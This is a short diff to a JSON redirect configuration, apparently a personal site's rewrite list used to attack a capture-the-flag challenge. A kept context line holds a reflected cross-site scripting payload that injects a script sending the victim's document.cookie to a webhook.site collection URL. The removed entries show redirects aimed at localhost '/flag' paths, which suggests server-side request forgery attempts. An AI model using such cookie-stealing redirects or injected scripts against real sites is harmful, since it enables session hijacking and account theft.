@@ -5,16 +5,8 @@
       "destination":"http://miday_ahdnsivs.nicewhite.eu.org:60007/search?search=\"><script>window.location=\"https://webhook.site/c0a1d835-d7e9-4dcc-add9-8c92f436e2a0/\"%2bdocument.cookie</script>"
     },
     {
-      "source":"/opengoogle",
-      "destination":"https://google.com/amp/s/localhost:8081/flag/"
-    },
-    {
       "source": "/argsus",
       "destination": "https://solem.dev/argsus"
-    },
-    {
-      "source": "/flagz",
-      "destination": "https://127.0.0.1:8081/flag"
     },
     {
       "source": "/(.*)", 
